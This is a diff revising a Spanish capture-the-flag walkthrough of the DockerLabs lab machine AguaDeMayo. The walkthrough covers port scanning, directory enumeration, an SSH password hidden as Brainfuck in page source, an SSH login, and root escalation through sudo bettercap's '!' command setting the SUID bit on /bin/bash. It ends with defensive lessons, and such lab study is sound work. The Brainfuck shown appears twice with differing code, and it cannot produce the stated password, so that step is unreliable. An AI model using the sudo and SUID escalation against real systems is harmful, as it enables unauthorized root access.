@@ -1,62 +1,157 @@
-# AGUADEMAYO — DockerLabs
+# AguaDeMayo — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** The Hackers Labs  
+**Fecha de creación:** 14/05/2024  
+**Técnicas:** Nmap · Dirb · Código fuente (Brainfuck) · Dcode.fr · SSH · Privesc (bettercap/sudo)
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **AGUADEMAYO** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — código oculto en el fuente](#2-enumeración-web--código-oculto-en-el-fuente)
+3. [Decodificación Brainfuck](#3-decodificación-brainfuck)
+4. [Acceso SSH](#4-acceso-ssh)
+5. [Escalada de privilegios — bettercap](#5-escalada-de-privilegios--bettercap)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable
+```bash
+sudo bash auto_deploy.sh aguademayo.tar
+```
 
-Haremos un escaneo profundo de los puertos abiertos de la maquina vulnerable.
+> IP asignada: `172.17.0.2`.
 
-## 2. Enumeración
+Escaneo completo con volcado a fichero:
 
-Como vemos que tiene un servidor web vamos a ver si cuenta con algún directorio
-oculto que podamos explorar con dirb
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+cat Puertos
+```
 
-Vemos que en el código fuente de la pagina principal un comentario raro, así que
-le preguntaremos a chatgpt para que nos ayude a saber que es.
+```
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+| http-title: Apache2 Debian Default Page: It works
+```
 
-## 3. Explotación
+---
 
-Ahora utilizaremos dcode.fr para descifrarlo.
+## 2. Enumeración web — código oculto en el fuente
 
-Ahora en el otro directorio que encontramos es una imagen llamada agua_ssh,
-hice pruebas y no encontré nada, así que suponemos que es un usuario de ssh y la
-contraseña la que tenemos de antes.
+Visitamos `http://172.17.0.2` — página por defecto de Apache. Lanzamos dirb para buscar directorios:
 
-## 4. Post-explotación
+```bash
+dirb http://172.17.0.2
+```
 
-Nos conectamos por ssh y vemos que tenemos acceso al usuario.
+```
+GENERATED WORDS: 4612
+==> DIRECTORY: http://172.17.0.2/images/
++ http://172.17.0.2/index.html  (CODE:200|SIZE:11142)
+```
 
-Para ver el escalado de privilegios ejecutamos sudo -l y vemos que tenemos
-permisos, mirándolo es un ejecutable, así que lo ejecutamos.
+Directorio `/images/` con una imagen `agua_ssh.jpg` y página por defecto. Inspeccionamos el código fuente de `index.html` (Ctrl+U) y encontramos un comentario con texto extraño al final:
 
-## 5. Escalada de privilegios
+```
++++++++[>+++++++++++++>+++++>+++<<<<-]>---.>++.>-.+++.----.++++.
+```
 
-Vemos que nos permite ejecutar help y ver de que trata, con la ayuda nos damos
-cuenta de que si escribimos ! y a continuación algún comando lo ejecuta como un
-Shell.
+> 💡 Este es código **Brainfuck** — un lenguaje de programación esotérico minimalista con solo 8 comandos (`<>+-.,[]`). Es ilegible para humanos pero ejecutable. En CTFs se usa para ocultar contraseñas.
 
-Ejecutamos el comando para poder tener luego una consola interactiva como
-root, aunque ya ejecutándolo antes éramos root.
+---
+
+## 3. Decodificación Brainfuck
+
+Usamos [dcode.fr](https://www.dcode.fr/) → seleccionamos **Brainfuck Interpreter** → pegamos el código:
+
+```
+Input: +++++++[>+++++++++++++>+++++>+++<<<<-]>---.>++.>-.+++.----.++++.
+Output: bebeaguaqueessano
+```
+
+> 💡 La imagen del directorio se llama `agua_ssh` — probablemente el usuario SSH sea **agua** y la contraseña sea lo que acabamos de decodificar.
+
+---
+
+## 4. Acceso SSH
+
+```bash
+ssh agua@172.17.0.2
+```
+
+```
+agua@172.17.0.2's password: bebeaguaqueessano
+agua@74bb0f12f555:~$
+```
+
+✅ Acceso como **agua**.
+
+---
+
+## 5. Escalada de privilegios — bettercap
+
+Comprobamos permisos sudo:
+
+```bash
+agua@74bb0f12f555:~$ sudo -l
+```
+
+```
+User agua may run the following commands on 74bb0f12f555:
+    (root) NOPASSWD: /usr/bin/bettercap
+```
+
+**bettercap** con sudo sin contraseña. Lo ejecutamos y exploramos los comandos disponibles con `help`:
+
+```bash
+agua@74bb0f12f555:~$ sudo /usr/bin/bettercap
+bettercap v2.32.0 > help
+```
+
+```
+! COMMAND  : Execute a shell command and print its output.
+```
+
+El comando `!` ejecuta comandos del sistema como root. Usamos esto para activar el bit SUID en `/bin/bash`:
+
+```bash
+172.17.0.0/16 > 172.17.0.2 » ! chmod u+s /bin/bash
+172.17.0.0/16 > 172.17.0.2 » exit
+```
+
+Ahora ejecutamos bash con privilegios del propietario (root):
+
+```bash
+agua@74bb0f12f555:~$ bash -p
+bash-5.2# whoami
+root
+```
+
+✅ Somos **root**.
+
+---
 
 ## 6. Lección aprendida
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+| Vulnerabilidad | Dónde | Impacto |
+|----------------|-------|---------|
+| **Contraseña en Brainfuck en código fuente** | `index.html` | Credenciales SSH sin protección real |
+| **bettercap con sudo sin restricción** | `/usr/bin/bettercap` | Ejecución de comandos como root via `!` |
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+**Para defenderse:**
+- Los encodings como Brainfuck, Base64 o ROT13 no son cifrado — cualquiera puede decodificarlos. Nunca ocultar credenciales en el código fuente.
+- bettercap (y cualquier herramienta de red) con permisos sudo puede ejecutar comandos del sistema. Si se necesita para un usuario específico, restringir con AppArmor o SELinux.
+- `bash -p` mantiene los privilegios elevados si el binario tiene SUID. Evitar activar SUID en bash.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
 *¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
